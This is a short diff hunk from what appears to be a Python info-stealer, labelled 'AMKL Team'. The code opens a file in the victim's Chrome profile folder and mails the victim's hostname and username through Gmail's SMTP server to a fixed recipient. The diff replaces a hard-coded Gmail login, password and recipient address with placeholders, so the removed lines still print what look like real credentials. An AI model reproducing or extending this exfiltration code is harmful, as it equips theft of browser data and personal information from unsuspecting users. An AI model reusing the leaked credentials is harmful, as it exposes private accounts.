@@ -11,8 +11,8 @@ f = open('C:\\Users' + username + '\AppData\Local\Google\Chrome\\User Data\Defau
 def send():
     mailsender = smtplib.SMTP('smtp.gmail.com', 587)
     mailsender.starttls()
-    mailsender.login('minecorpnews@gmail.com', '21042009Q')
-    mail_recipient = "nata.re.od@gmail.com"
+    mailsender.login('s', 's')
+    mail_recipient = "s"
     mail_subject = 'AMKL Team'
     mail_body = 'IP: ' + hostname + '\nUsername: ' + username + '\nAMKL Team'
     msg = MIMEText(mail_body, 'plain', 'utf-8')
